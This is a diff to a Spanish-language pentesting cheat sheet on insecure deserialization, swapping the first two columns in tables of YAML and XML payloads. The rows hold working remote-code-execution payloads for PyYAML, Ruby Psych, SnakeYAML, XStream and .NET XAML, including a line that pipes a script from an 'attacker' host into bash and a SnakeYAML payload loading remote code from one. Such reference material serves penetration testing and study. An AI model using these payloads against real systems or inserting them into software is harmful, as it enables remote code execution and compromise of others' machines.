@@ -61,17 +61,17 @@ ysoserial.net.exe -g ObjectDataProvider -f Json.Net -c "calc"
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| PyYAML `yaml.load()` (sin Loader) | `!!python/object/apply:os.system ["id"]` | Pre-PyYAML 5.1 = RCE inmediato. |
+| `!!python/object/apply:os.system ["id"]` | PyYAML `yaml.load()` (sin Loader) | Pre-PyYAML 5.1 = RCE inmediato. |
 | PyYAML moderno (con Loader=yaml.Loader) | Mismo payload — Loader unsafe = RCE. | Solo `SafeLoader` está safe. |
-| PyYAML `python/object/new` | `!!python/object/new:type ["x", !!python/tuple [], {"extend": !!python/name:exec}]` | Bypass de filtros básicos. |
-| PyYAML object/apply subprocess | `!!python/object/apply:subprocess.check_output [["id"]]` | RCE via subprocess. |
-| PyYAML `os.system` clásico | `!!python/object/apply:os.system ["curl http://attacker/x \| bash"]` | Reverse shell. |
+| `!!python/object/new:type ["x", !!python/tuple [], {"extend": !!python/name:exec}]` | PyYAML `python/object/new` | Bypass de filtros básicos. |
+| `!!python/object/apply:subprocess.check_output [["id"]]` | PyYAML object/apply subprocess | RCE via subprocess. |
+| `!!python/object/apply:os.system ["curl http://attacker/x \| bash"]` | PyYAML `os.system` clásico | Reverse shell. |
 | Ruby YAML.load (CVE-2013-0156) | Universal gadget — ver `Insecure Deserialization - Object Injection`. | Rails. |
-| Ruby YAML.load Psych < 3.1 | `--- !ruby/object:Gem::Requirement requirements: ...` | Hashicorp / Rails legacy. |
-| SnakeYAML (Java) | `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/"]]]]` | Carga JAR remoto. |
+| `--- !ruby/object:Gem::Requirement requirements: ...` | Ruby YAML.load Psych < 3.1 | Hashicorp / Rails legacy. |
+| `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/"]]]]` | SnakeYAML (Java) | Carga JAR remoto. |
 | SnakeYAML CVE-2022-1471 | Versions < 1.33 default Constructor unsafe. | Spring apps típicas. |
-| YAML.NET (.NET) | `!System.Diagnostics.Process` con StartInfo | Si UseUnsafeMode habilitado. |
-| RemoteCodeExec via PyYAML | `!!python/object/apply:builtins.eval ["__import__('os').system('id')"]` | eval-based bypass. |
+| `!System.Diagnostics.Process` con StartInfo | YAML.NET (.NET) | Si UseUnsafeMode habilitado. |
+| `!!python/object/apply:builtins.eval ["__import__('os').system('id')"]` | RemoteCodeExec via PyYAML | eval-based bypass. |
 ^deser-fmt-yaml
 
 ### Payload PyYAML completo
@@ -101,7 +101,7 @@ yaml.safe_load(payload)  # Raises ConstructorError
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| XStream (Java) — clásico | `<map><entry><java.beans.EventHandler>...</java.beans.EventHandler></entry></map>` | EventHandler-based RCE. |
+| `<map><entry><java.beans.EventHandler>...</java.beans.EventHandler></entry></map>` | XStream (Java) — clásico | EventHandler-based RCE. |
 | XStream CVE-2021-39139 | Decenas de gadgets — JdkDynamicAggregateTranslator, etc. | Versiones < 1.4.18. |
 | XStream con `xstream.fromXML(input)` | Sink primario | Equivalente a readObject pero XML. |
 | .NET XmlSerializer | Solo vulnerable si tipos arbitrarios + KnownTypes habilitado | Más restrictivo. |
@@ -109,7 +109,7 @@ yaml.safe_load(payload)  # Raises ConstructorError
 | .NET NetDataContractSerializer | Vulnerable like BinaryFormatter | Incluye type metadata. |
 | .NET LosFormatter | ViewState legacy | Mismo riesgo que BinaryFormatter. |
 | SOAPFormatter | Otra alternativa .NET vulnerable | Histórico. |
-| XAML payload (.NET WPF/PresentationFramework) | `<ObjectDataProvider ObjectType="System.Diagnostics.Process" MethodName="Start">...</ObjectDataProvider>` | Con NetDataContractSerializer / XamlReader. |
+| `<ObjectDataProvider ObjectType="System.Diagnostics.Process" MethodName="Start">...</ObjectDataProvider>` | XAML payload (.NET WPF/PresentationFramework) | Con NetDataContractSerializer / XamlReader. |
 | Castor XML (Java) | Vulnerable como XStream | Menos común. |
 | MarshalSec (Apache Commons) | Tool similar a ysoserial pero para XML/JSON deser | Ver `Insecure Deserialization - Tooling`. |
 ^deser-fmt-xml
